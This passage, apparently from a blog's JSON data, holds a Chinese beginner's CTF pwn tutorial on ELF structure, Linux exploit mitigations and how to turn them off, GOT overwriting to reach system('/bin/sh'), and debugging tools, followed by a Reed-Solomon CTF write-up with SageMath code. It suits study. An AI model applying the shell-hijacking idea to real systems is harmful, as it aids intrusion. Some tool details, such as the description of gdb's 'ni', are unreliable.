即可</li>\n<li><strong>PIE</strong> ( Position Independent Executable )<br> 和 ASLR 类似，让 ELF 的地址随机化加载<br> 高版本 gcc 默认开启，编译加 <code>-no-pie</code> 参数可以关闭，旧版本则需加 <code>-fpic-pie</code> 参数开启</li>\n<li><strong>Full RELRO</strong> ( Read-Only Relocation )<br> 禁止写入 <code>.got.plt</code> 表<br> gcc 编译加 <code>-z relro</code> 参数开启。</li>\n</ol>\n<h2 id=\"GOT和PLT\"><a href=\"#GOT和PLT\" class=\"headerlink\" title=\"GOT和PLT\"></a>GOT和PLT</h2><p><code>.plt</code> 表是一段代码，可从内存中读取一个地址然后进行跳转，而 <code>.got.plt</code> 表则存放函数的实际地址。<br>实际上，<code>.got.plt</code> 表是一个函数指针数组，存放 ELF 所有用到的外部函数在内存中的地址，由操作系统初始化。<br>题目中如果没开 <code>Full RELRO</code> 保护，那么就有可能通过修改 <code>.got.plt</code> 表中的函数地址来偷梁换柱，比如把表中 <code>puts</code> 的地址换成 <code>system</code> 的地址就能使 <code>puts(&quot;\\bin\\sh&quot;)</code> 变成 <code>system(&quot;/bin/sh&quot;)</code>，从而拿到 shell 。</p>\n<h2 id=\"常用工具\"><a href=\"#常用工具\" class=\"headerlink\" title=\"常用工具\"></a>常用工具</h2><ol>\n<li><p><strong>IDA</strong></p>\n<p> 拿到程序第一件事——用 IDA 看看伪代码<br> 分 32 位和 64 位两个版本，<strong>这个打开不行就换另一个</strong>，虽然我也不知道为啥不加个自动识别（）<br> 把程序拖进去，弹出一个奇怪的选项框，初学者直接 <code>enter</code>或者点 <code>OK</code> 就完事，然后进到 <code>IDA View-A</code> 标签页，这里初始时一般是流程图的形式，在此标签页按空格可以切换到普通模式，<strong>记住不是在 <code>Pseudocode-A</code> 按</strong><br> 这时候按 <code>F5</code> 生成伪代码，看到顶上的标签页切到了 <code>Pseudocode-A</code> ， Pseudocode 是伪码的意思，至于这个 A ，你如果再按一次 <code>F5</code> 就能新建一个 <code>Pseudocode-B</code> 了（）<br> 然后就可以这点点那点点发现新世界了，嘿嘿<br> 如下是一些常用的快捷键：</p>\n<ul>\n<li>按 <code>Esc</code> 可以返回刚才的页面</li>\n<li>按 <code>Tab</code> 可以在 <code>IDA View-A</code> 和 <code>Pseudocode-A</code> 等标签页之间切换</li>\n<li>双击函数或者变量可以跳转到它所在的地方</li>\n<li>点一下变量再按 <code>N</code> 可以对变量重命名，有时方便分析</li>\n<li><code>Shift+F12</code> 查找字符串</li>\n</ul>\n</li>\n<li><p><strong>pwntools</strong></p>\n<p> python 的一个库，可以用与远程服务器或者本地程序交互，但不保证在 Windows 下能正常使用（反正我 Windows 跑 pwntools 是有问题的<br> 常用操作：</p>\n<ul>\n<li><code>r = process(&quot;./pwn&quot;)</code> 本地运行程序（其实本地一般用 <code>p</code> 作变量表示process或者<code>io</code>兼顾本地和远程，看个人习惯了</li>\n<li><code>r = remote(ip, port)</code> 连接服务器</li>\n<li><code>r.sendline(data)</code> 发送数据，末尾补 <code>\\x0a</code>（换行符）</li>\n<li><code>r.send(data)</code> 发送数据，末尾不补 <code>\\x0a</code></li>\n<li><code>r.recvline()</code> 接收一行数据</li>\n<li><code>r.recvuntil(str)</code> 接收直到遇到 <code>str</code> 为止</li>\n<li><code>r.recv(n)</code>接收 <code>n</code> 个字节</li>\n<li><code>r.interactive()</code> 开始人工手动交互</li>\n</ul>\n<p> pwntools 在 python3 中使用的话，交互的数据都是 <code>bytes</code> 类型，而不是 <code>str</code> 类型，意思就是 <code>send</code> 里的东西要是字节串， <code>recv</code> 出来的也是字节串，字符串转字节方法一般是 <code>str.encode()</code> ，或者 <code>send(b&#39;hello&#39;)</code></p>\n</li>\n<li><p><strong>pwndbg</strong></p>\n<p> pwn 里面少不了本地调试，正常人都不能肉眼分析，那么就要用到 gdb ，but 裸的 gdb 太朴素了，不能满足人们日益增长的对优雅的追求，所以就有了<strong>颜值极高</strong>的 gdb 插件—— pwndbg<br> 安装方式：</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class=\"line\"><span class=\"built_in\">cd</span> pwndbg</span><br><span class=\"line\">./setup.sh</span><br></pre></td></tr></table></figure>\n\n<p> 然后康康 <code>~/.gdbinit</code> 里有没有 <code>source ~/pwndbg/gdbinit.py</code> ，如果没有就加上，然后 <code>source ~/.gdbinit</code> ，然后就可以愉快地玩耍了<br> 在 VSCode 里起 gdb 要用 tmux ，直接 <code>sudo apt-get install tmux</code> 安装</p>\n<blockquote>\n<p><strong>tmux的简单使用</strong>：<br> <code>tmux</code> 进入窗口<br> <code>tmux ls</code> 查看会话列表<br> <code>Ctrl+B</code> <code>左右键</code> 切换会话窗口，一般默认左右分布，也可调成上下<br> <code>Ctrl+B</code> <code>D</code> 退出当前会话但不关闭，可以 <code>tmux attach -t &lt;会话名&gt;</code> 再次进入</p>\n</blockquote>\n<p> 脚本里可以使用如下语句起 gdb：</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(p,gdbscript=<span class=\"string\">&quot;b main&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p> pwndbg 界面由上至下依次为</p>\n<ul>\n<li><strong>legend</strong>：图例，一般指示黄色为 Stack（栈），蓝色为 Heap（堆），红色为 Code（代码），紫色为 Data（数据），白色下划线为RWX（不知道啥），白色为 Rodata（只读数据）</li>\n<li><strong>registers</strong>：显示 CPU 的寄存器值</li>\n<li><strong>disasm</strong>：显示当前地址的反汇编代码</li>\n<li><strong>stack</strong>：显示栈的内容</li>\n<li><strong>backtrace</strong>：显示调用堆栈（我也不知道具体干嘛的）</li>\n</ul>\n<p> 常用操作：</p>\n<ul>\n<li><code>x/4xg 0x400000</code> 查看内存中地址 <code>0x400000</code> 开始的 4*16 个字节，以 8 个字节每组的 16 进制形式显示，一般在分析 64 位程序时使用，因为 64 位程序的地址是 8 个字节， 32 位时，命令可以换成 <code>x/4x</code> ，每组 4 个字节，适用 32 位程序的地址</li>\n<li><code>ni</code> 也就是 next into ，执行下一条指令，如果是函数调用，就进入函数</li>\n<li><code>si</code> 也就是 step into ，执行下一条指令，如果是函数调用，就进入函数，但是不会执行函数内的第一条指令，而是停在函数内的第一条指令上</li>\n<li><code>c</code> continue ，继续执行，直到遇到断点或者程序结束</li>\n<li><code>q</code> quit ，退出 gdb</li>\n<li><code>vmmap</code> 查看内存映射，可以看到程序的基地址，栈地址，堆地址等，后面加个 <code>libc</code> 可以单看 libc 的基地址（白色的那行</li>\n<li><code>set</code> 改变变量的值，比如 <code>set $eax=0</code> 就把 eax 的值改成了 0</li>\n<li><code>b</code> 设置断点，后面加地址或者函数名，比如 <code>b *0x400000</code> 或者 <code>b main</code> ，后者是在 main 函数入口处设置断点，或者 <code>b *main+111</code> 在 main 函数的第 111 条指令处设置断点</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"常见攻击方式\"><a href=\"#常见攻击方式\" class=\"headerlink\" title=\"常见攻击方式\"></a>常见攻击方式</h2><h3 id=\"整数溢出\"><a href=\"#整数溢出\" class=\"headerlink\" title=\"整数溢出\"></a>整数溢出</h3><p>这个比较简单，大概就是通过溢出绕过一些大小判断，不再赘述。</p>\n<h3 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a>栈溢出</h3><p>先说几个概念<br>执行 call 指令时， CPU 会先把 call 指令的下一条指令地址压栈再跳转，返回时 ret 指令会从栈中把存放的地址弹出到 EIP 。<br>gets 不检查读入的字符串长度，所以可能会出现栈溢出。<br>当栈作为缓冲区时，如果输入的数据长度超过缓冲区的长度，就会发生栈溢出，从而覆盖返回地址，从而控制程序流程。</p>\n<p>未完待续…</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li>《从0到1：CTFer成长之路》——Nu1L战队[著]</li>\n<li>《CTF竞赛权威指南.Pwn篇》——杨超[著]</li>\n<li><a href=\"https://blog.csdn.net/sui_152/article/details/121650341\">https://blog.csdn.net/sui_152/article/details/121650341</a></li>\n<li><a href=\"https://stackoverflow.com/questions/65745514/what-is-the-difference-between-rodata-and-rdata\">https://stackoverflow.com/questions/65745514/what-is-the-difference-between-rodata-and-rdata</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_52553215/article/details/120690453\">https://blog.csdn.net/weixin_52553215/article/details/120690453</a></li>\n<li><a href=\"https://blog.csdn.net/zino00/article/details/122716412\">https://blog.csdn.net/zino00/article/details/122716412</a></li>\n<li><a href=\"https://blog.csdn.net/Demondai999/article/details/123875264\">https://blog.csdn.net/Demondai999/article/details/123875264</a></li>\n</ul>\n","excerpt":"<p>浅记一下这些天学 pwn 的历程</p>","more":"<hr>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>本文默认读者具有一定的汇编基础。</p>\n<h2 id=\"ELF文件的结构\"><a href=\"#ELF文件的结构\" class=\"headerlink\" title=\"ELF文件的结构\"></a>ELF文件的结构</h2><p><strong>ELF</strong>（Executable and Linkable Format）即 Linux 下的可执行文件格式，和 Windows 下的 <strong>PE</strong> 格式类似，但 Linux 中的可执行文件一般不会加后缀名。<br>ELF 文件中有多个节（ Section ），主要有：</p>\n<ul>\n<li><strong>.text</strong> 节：即代码段，用来放代码</li>\n<li><strong>.rodata</strong> 节：ro 即 read only ，<strong>只读</strong>数据段，用来放静态数据，如果尝试修改会报错<blockquote>\n<p><code>.rdata</code> 和 <code>.rodata</code> 的区别：两者都是只读数据段，但 <code>.rdata</code> 是 Windows 的常用说法，而 Linux 中则一般称 <code>.rodata</code></p>\n</blockquote>\n</li>\n<li><strong>.data</strong> 节：数据段，存放<strong>可修改</strong>的数据</li>\n<li><strong>.bss</strong> 节：中文不知道叫什么名字的段，也是放<strong>可修改</strong>的数据，但是<strong>没有初始化</strong>，所以不占ELF文件的空间，程序运行时会自动分配内存</li>\n<li><strong>.plt</strong> 节和 <strong>.got</strong> 节：外部调用段（也不知道叫什么名字，这个是 AI 给我打的），调用动态链接库的函数的时候会用到</li>\n</ul>\n<h2 id=\"Linux下的漏洞缓解措施\"><a href=\"#Linux下的漏洞缓解措施\" class=\"headerlink\" title=\"Linux下的漏洞缓解措施\"></a>Linux下的漏洞缓解措施</h2><p>有攻就有防，为了不被攻击者随便打烂，一些防范措施是必不可少的。<br>在终端里可以执行 <code>checksec --file=文件名</code> 来查看 ELF 文件的保护机制。</p>\n<ol>\n<li><strong>NX</strong> ( No eXecute )(没错 X 就是大写，没打错)<br> 基本规则为<strong>可写权限</strong>与<strong>可执行权限</strong>互斥，即可被修改写入 shellcode 的内存都不可执行，被执行的代码数据不可修改，至于 shellcode 是啥，后面再提。<br> gcc 默认开启，编译加 <code>-z execstack</code> 参数可以关闭</li>\n<li><strong>Stack Canary</strong><br> Canary 意为金丝雀，以前矿工进入矿井时都会随身带一只金丝雀，通过观察金丝雀的状态来判断氧气浓度等情况。这个保护专门针对栈溢出攻击。<br> gcc 同样默认开启，编译加 <code>fno-stack-protector</code> 参数关闭</li>\n<li><strong>ASLR</strong> ( Address Space Layout Randomization )<br> 将程序的堆栈地址和动态链接库的加载地址进行一定的随机化<br> ASLR 是系统级的保护机制，关闭要修改 /proc/sys/kernel/randomize_va_space 文件，写入 0 即可</li>\n<li><strong>PIE</strong> ( Position Independent Executable )<br> 和 ASLR 类似，让 ELF 的地址随机化加载<br> 高版本 gcc 默认开启，编译加 <code>-no-pie</code> 参数可以关闭，旧版本则需加 <code>-fpic-pie</code> 参数开启</li>\n<li><strong>Full RELRO</strong> ( Read-Only Relocation )<br> 禁止写入 <code>.got.plt</code> 表<br> gcc 编译加 <code>-z relro</code> 参数开启。</li>\n</ol>\n<h2 id=\"GOT和PLT\"><a href=\"#GOT和PLT\" class=\"headerlink\" title=\"GOT和PLT\"></a>GOT和PLT</h2><p><code>.plt</code> 表是一段代码，可从内存中读取一个地址然后进行跳转，而 <code>.got.plt</code> 表则存放函数的实际地址。<br>实际上，<code>.got.plt</code> 表是一个函数指针数组，存放 ELF 所有用到的外部函数在内存中的地址，由操作系统初始化。<br>题目中如果没开 <code>Full RELRO</code> 保护，那么就有可能通过修改 <code>.got.plt</code> 表中的函数地址来偷梁换柱，比如把表中 <code>puts</code> 的地址换成 <code>system</code> 的地址就能使 <code>puts(&quot;\\bin\\sh&quot;)</code> 变成 <code>system(&quot;/bin/sh&quot;)</code>，从而拿到 shell 。</p>\n<h2 id=\"常用工具\"><a href=\"#常用工具\" class=\"headerlink\" title=\"常用工具\"></a>常用工具</h2><ol>\n<li><p><strong>IDA</strong></p>\n<p> 拿到程序第一件事——用 IDA 看看伪代码<br> 分 32 位和 64 位两个版本，<strong>这个打开不行就换另一个</strong>，虽然我也不知道为啥不加个自动识别（）<br> 把程序拖进去，弹出一个奇怪的选项框，初学者直接 <code>enter</code>或者点 <code>OK</code> 就完事，然后进到 <code>IDA View-A</code> 标签页，这里初始时一般是流程图的形式，在此标签页按空格可以切换到普通模式，<strong>记住不是在 <code>Pseudocode-A</code> 按</strong><br> 这时候按 <code>F5</code> 生成伪代码，看到顶上的标签页切到了 <code>Pseudocode-A</code> ， Pseudocode 是伪码的意思，至于这个 A ，你如果再按一次 <code>F5</code> 就能新建一个 <code>Pseudocode-B</code> 了（）<br> 然后就可以这点点那点点发现新世界了，嘿嘿<br> 如下是一些常用的快捷键：</p>\n<ul>\n<li>按 <code>Esc</code> 可以返回刚才的页面</li>\n<li>按 <code>Tab</code> 可以在 <code>IDA View-A</code> 和 <code>Pseudocode-A</code> 等标签页之间切换</li>\n<li>双击函数或者变量可以跳转到它所在的地方</li>\n<li>点一下变量再按 <code>N</code> 可以对变量重命名，有时方便分析</li>\n<li><code>Shift+F12</code> 查找字符串</li>\n</ul>\n</li>\n<li><p><strong>pwntools</strong></p>\n<p> python 的一个库，可以用与远程服务器或者本地程序交互，但不保证在 Windows 下能正常使用（反正我 Windows 跑 pwntools 是有问题的<br> 常用操作：</p>\n<ul>\n<li><code>r = process(&quot;./pwn&quot;)</code> 本地运行程序（其实本地一般用 <code>p</code> 作变量表示process或者<code>io</code>兼顾本地和远程，看个人习惯了</li>\n<li><code>r = remote(ip, port)</code> 连接服务器</li>\n<li><code>r.sendline(data)</code> 发送数据，末尾补 <code>\\x0a</code>（换行符）</li>\n<li><code>r.send(data)</code> 发送数据，末尾不补 <code>\\x0a</code></li>\n<li><code>r.recvline()</code> 接收一行数据</li>\n<li><code>r.recvuntil(str)</code> 接收直到遇到 <code>str</code> 为止</li>\n<li><code>r.recv(n)</code>接收 <code>n</code> 个字节</li>\n<li><code>r.interactive()</code> 开始人工手动交互</li>\n</ul>\n<p> pwntools 在 python3 中使用的话，交互的数据都是 <code>bytes</code> 类型，而不是 <code>str</code> 类型，意思就是 <code>send</code> 里的东西要是字节串， <code>recv</code> 出来的也是字节串，字符串转字节方法一般是 <code>str.encode()</code> ，或者 <code>send(b&#39;hello&#39;)</code></p>\n</li>\n<li><p><strong>pwndbg</strong></p>\n<p> pwn 里面少不了本地调试，正常人都不能肉眼分析，那么就要用到 gdb ，but 裸的 gdb 太朴素了，不能满足人们日益增长的对优雅的追求，所以就有了<strong>颜值极高</strong>的 gdb 插件—— pwndbg<br> 安装方式：</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class=\"line\"><span class=\"built_in\">cd</span> pwndbg</span><br><span class=\"line\">./setup.sh</span><br></pre></td></tr></table></figure>\n\n<p> 然后康康 <code>~/.gdbinit</code> 里有没有 <code>source ~/pwndbg/gdbinit.py</code> ，如果没有就加上，然后 <code>source ~/.gdbinit</code> ，然后就可以愉快地玩耍了<br> 在 VSCode 里起 gdb 要用 tmux ，直接 <code>sudo apt-get install tmux</code> 安装</p>\n<blockquote>\n<p><strong>tmux的简单使用</strong>：<br> <code>tmux</code> 进入窗口<br> <code>tmux ls</code> 查看会话列表<br> <code>Ctrl+B</code> <code>左右键</code> 切换会话窗口，一般默认左右分布，也可调成上下<br> <code>Ctrl+B</code> <code>D</code> 退出当前会话但不关闭，可以 <code>tmux attach -t &lt;会话名&gt;</code> 再次进入</p>\n</blockquote>\n<p> 脚本里可以使用如下语句起 gdb：</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(p,gdbscript=<span class=\"string\">&quot;b main&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p> pwndbg 界面由上至下依次为</p>\n<ul>\n<li><strong>legend</strong>：图例，一般指示黄色为 Stack（栈），蓝色为 Heap（堆），红色为 Code（代码），紫色为 Data（数据），白色下划线为RWX（不知道啥），白色为 Rodata（只读数据）</li>\n<li><strong>registers</strong>：显示 CPU 的寄存器值</li>\n<li><strong>disasm</strong>：显示当前地址的反汇编代码</li>\n<li><strong>stack</strong>：显示栈的内容</li>\n<li><strong>backtrace</strong>：显示调用堆栈（我也不知道具体干嘛的）</li>\n</ul>\n<p> 常用操作：</p>\n<ul>\n<li><code>x/4xg 0x400000</code> 查看内存中地址 <code>0x400000</code> 开始的 4*16 个字节，以 8 个字节每组的 16 进制形式显示，一般在分析 64 位程序时使用，因为 64 位程序的地址是 8 个字节， 32 位时，命令可以换成 <code>x/4x</code> ，每组 4 个字节，适用 32 位程序的地址</li>\n<li><code>ni</code> 也就是 next into ，执行下一条指令，如果是函数调用，就进入函数</li>\n<li><code>si</code> 也就是 step into ，执行下一条指令，如果是函数调用，就进入函数，但是不会执行函数内的第一条指令，而是停在函数内的第一条指令上</li>\n<li><code>c</code> continue ，继续执行，直到遇到断点或者程序结束</li>\n<li><code>q</code> quit ，退出 gdb</li>\n<li><code>vmmap</code> 查看内存映射，可以看到程序的基地址，栈地址，堆地址等，后面加个 <code>libc</code> 可以单看 libc 的基地址（白色的那行</li>\n<li><code>set</code> 改变变量的值，比如 <code>set $eax=0</code> 就把 eax 的值改成了 0</li>\n<li><code>b</code> 设置断点，后面加地址或者函数名，比如 <code>b *0x400000</code> 或者 <code>b main</code> ，后者是在 main 函数入口处设置断点，或者 <code>b *main+111</code> 在 main 函数的第 111 条指令处设置断点</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"常见攻击方式\"><a href=\"#常见攻击方式\" class=\"headerlink\" title=\"常见攻击方式\"></a>常见攻击方式</h2><h3 id=\"整数溢出\"><a href=\"#整数溢出\" class=\"headerlink\" title=\"整数溢出\"></a>整数溢出</h3><p>这个比较简单，大概就是通过溢出绕过一些大小判断，不再赘述。</p>\n<h3 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a>栈溢出</h3><p>先说几个概念<br>执行 call 指令时， CPU 会先把 call 指令的下一条指令地址压栈再跳转，返回时 ret 指令会从栈中把存放的地址弹出到 EIP 。<br>gets 不检查读入的字符串长度，所以可能会出现栈溢出。<br>当栈作为缓冲区时，如果输入的数据长度超过缓冲区的长度，就会发生栈溢出，从而覆盖返回地址，从而控制程序流程。</p>\n<p>未完待续…</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li>《从0到1：CTFer成长之路》——Nu1L战队[著]</li>\n<li>《CTF竞赛权威指南.Pwn篇》——杨超[著]</li>\n<li><a href=\"https://blog.csdn.net/sui_152/article/details/121650341\">https://blog.csdn.net/sui_152/article/details/121650341</a></li>\n<li><a href=\"https://stackoverflow.com/questions/65745514/what-is-the-difference-between-rodata-and-rdata\">https://stackoverflow.com/questions/65745514/what-is-the-difference-between-rodata-and-rdata</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_52553215/article/details/120690453\">https://blog.csdn.net/weixin_52553215/article/details/120690453</a></li>\n<li><a href=\"https://blog.csdn.net/zino00/article/details/122716412\">https://blog.csdn.net/zino00/article/details/122716412</a></li>\n<li><a href=\"https://blog.csdn.net/Demondai999/article/details/123875264\">https://blog.csdn.net/Demondai999/article/details/123875264</a></li>\n</ul>"},{"title":"Reed-Solomon 纠错码","date":"2022-09-17T02:22:15.000Z","_content":"\n终于有时间整理一下了，爆破毕竟还是太粗鲁了。\n<!--more-->\n\n羊城杯的一道题，题目中只破坏了消息的随机两个位置，消息又在 256 以内，所以可以直接暴力枚举。\n下面探寻优雅点的解法。\n\n## 编码\n\n先来看看题目的代码，如下是编码的核心函数：\n\n```python\nm = 257\nF = Zmod(m)\nalpha = F(223)\nPR.<x> = PolynomialRing(F)\ngx = (x - alpha ^ 0) * (x - alpha ^ 1) * (x - alpha ^ 2) * (x - alpha ^ 3)\n\ndef encode_block(message):\n    assert isinstance(message, list)\n\n    f = PR([0] * 4 + message)\n    px = f % gx\n    mx = f - px\n    c = [_ for _ in mx]\n    return c + (8 - len(c)) * [0]\n```\n\n分析一下，代码中取一个生成多项式 $g(x)=(x-\\alpha^0)(x-\\alpha^1)(x-\\alpha^2)(x-\\alpha^3)$ ，然后将消息多项式 $M(x)$ 模 $g(x)$ ，得到余数多项式 $P(x)$ ，最后得到编码后的消息 $S(x)=M(x)-P(x)$ 。这时有 $S(x)\\equiv 0\\mod g(x)$ 。\n这里解释一下各个参数，当时我也是看了好久 sagemath 的文档也没搞懂。\n生成多项式 $g(x)=\\prod\\limits_{j=1}^{n-k}(x-\\alpha^j)$\n// TODO\n\n## 解码\n\n照着[这篇文章](https://zhuanlan.zhihu.com/p/104306038)搓了个 PGZ 解码器，代码如下：\n\n```python\ndef decode_block(r_x):\n    S = [PR(r_x)(alpha^i) for i in range(4)]\n    nu = 2\n    A = matrix(F,nu,nu)\n    for i in range(nu):\n        for j in range(nu):\n            A[i,j] = S[i+j]\n    b = vector(F,[-S[nu+i] for i in range(nu)])\n    x = list(A.solve_right(b))\n    x.append(1)\n    x.reverse()\n    Lambda = PR(x)\n    I = []\n    for i in range(8):\n        if Lambda(alpha^(-i))==0:\n            I.append(i)\n    I = I + [0] * (2 - len(I))\n    X = [alpha^I[i] for i in range(2)]\n    A = matrix(F,2,2)\n    for i in range(2):\n        for j in range(2):\n            A[i,j] = X[j]^i\n    b = list(A.solve_right(vector(F,S[:2])))\n    for i in range(len(I)):\n        r_x[I[i]] -= b[i]\n    return r_x[4:]\n```\n\n## 参考\n\n* <https://zhuanlan.zhihu.com/p/104306038>\n* <https://eprint.iacr.org/2017/733.pdf>\n","source":"_posts/Reed-Solomon 纠错码.md","raw":"---\ntitle: Reed-Solomon 纠错码\ndate: 2022-09-17T18:22:15+08:00\ntags: [数学,Crypto,抽象代数,CTF]\ncategories: 题解\n---\n\n终于有时间整理一下了，爆破毕竟还是太粗鲁了。\n<!--more-->\n\n羊城杯的一道题，题目中只破坏了消息的随机两个位置，消息又在 256 以内，所以可以直接暴力枚举。\n下面探寻优雅点的解法。\n\n## 编码\n\n先来看看题目的代码，如下是编码的核心函数：\n\n```python\nm = 257\nF = Zmod(m)\nalpha = F(223)\nPR.<x> = PolynomialRing(F)\ngx = (x - alpha ^ 0) * (x - alpha ^ 1) * (x - alpha ^ 2) * (x - alpha ^ 3)\n\ndef encode_block(message):\n    assert isinstance(message, list)\n\n    f = PR([0] * 4 + message)\n    px = f % gx\n    mx = f - px\n    c = [_ for _ in mx]\n    return c + (8 - len(c)) * [0]\n```\n\n分析一下，代码中取一个生成多项式 $g(x)=(x-\\alpha^0)(x-\\alpha^1)(x-\\alpha^2)(x-\\alpha^3)$ ，然后将消息多项式 $M(x)$ 模 $g(x)$ ，得到余数多项式 $P(x)$ ，最后得到编码后的消息 $S(x)=M(x)-P(x)$ 。这时有 $S(x)\\equiv 0\\mod g(x)$ 。\n这里解释一下各个参数，当时我也是看了好久 sagemath 的文档也没搞懂。\n生成多项式 $g(x)=\\prod\\limits_{j=1}^{n-k}(x-\\alpha^j)$\n// TODO\n\n## 解码\n\n照着[这篇文章](https://zhuanlan.zhihu.com/p/104306038)搓了个 PGZ 解码器，代码如下：\n\n```python\ndef decode_block(r_x):\n    S = [PR(r_x)(alpha^i) for i in range(4)]\n    nu = 2\n    A = matrix(F,nu,nu)\n    for i in range(nu):\n        for j in range(nu):\n            A[i,j] = S[i+j]\n    b = vector(F,[-S[nu+i] for i in range(nu)])\n    x = list(A.solve_right(b))\n    x.append(1)\n    x.reverse()\n    Lambda = PR(x)\n    I = []\n    for i in range(8):\n        if Lambda(alpha^(-i))==0:\n            I.append(i)\n    I = I + [0] * (2 - len(I))\n    X = [alpha^I[i] for i in range(2)]\n    A = matrix(F,2,2)\n    for i in range(2):\n        for j in range(2):\n            A[i,j] = X[j]^i\n    b = list(A.solve_right(vector(F,S[:2])))\n    for i in range(len(I)):\n        r_x[I[i]] -= b[i]\n    return r_x[4:]\n```\n\n## 参考\n\n* <https://zhuanlan.zhihu.com/p/104306038>\n* <https://eprint.iacr.org/2017/733.pdf>\n","slug":"Reed-Solomon 纠错码","published":1,"updated":"2024-06-05T07:53:20.758Z","_id":"clac8pkrr0000jg6g2yw9b03q","comments":1,"layout":"post","photos":[],"content":"<p>终于有时间整理一下了，爆破毕竟还是太粗鲁了。</p>\n<span id=\"more\"></span>\n\n<p>羊城杯的一道题，题目中只破坏了消息的随机两个位置，消息又在 256 以内，所以可以直接暴力枚举。<br>下面探寻优雅点的解法。</p>\n<h2 id=\"编码\"><a href=\"#编码\" class=\"headerlink\" title=\"编码\"></a>编码</h2><p>先来看看题目的代码，如下是编码的核心函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m = <span class=\"number\">257</span></span><br><span class=\"line\">F = Zmod(m)</span><br><span class=\"line\">alpha = F(<span class=\"number\">223</span>)</span><br><span class=\"line\">PR.&lt;x&gt; = PolynomialRing(F)</span><br><span class=\"line\">gx = (x - alpha ^ <span class=\"number\">0</span>) * (x - alpha ^ <span class=\"number\">1</span>) * (x - alpha ^ <span class=\"number\">2</span>) * (x - alpha ^ <span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encode_block</span>(<span class=\"params\">message</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> <span class=\"built_in\">isinstance</span>(message, <span class=\"built_in\">list</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    f = PR([<span class=\"number\">0</span>] * <span class=\"number\">4</span> + message)</span><br><span class=\"line\">    px = f % gx</span><br><span class=\"line\">    mx = f - px</span><br><span class=\"line\">    c = [_ <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> mx]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> c + (<span class=\"number\">8</span> - <span class=\"built_in\">len</span>(c)) * [<span class=\"number\">0</span>]</span><br></pre></td></tr></table></figure>\n\n<p>分析一下，代码中取一个生成多项式 $g(x)=(x-\\alpha^0)(x-\\alpha^1)(x-\\alpha^2)(x-\\alpha^3)$ ，然后将消息多项式 $M(x)$ 模 $g(x)$ ，得到余数多项式 $P(x)$ ，最后得到编码后的消息 $S(x)=M(x)-P(x)$ 。这时有 $S(x)\\equiv 0\\mod g(x)$ 。<br>这里解释一下各个参数，当时我也是看了好久 sagemath 的文档也没搞懂。<br>生成多项式 $g(x)=\\prod\\limits_{j=1}^{n-k}(x-\\alpha^j)$<br>// TODO</p>\n<h2 id=\"解码\"><a href=\"#解码\" class=\"headerlink\" title=\"解码\"></a>解码</h2><p>照着<a href=\"https://zhuanlan.zhihu.com/p/104306038\">这篇文章</a>搓了个 PGZ 解码器，代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span 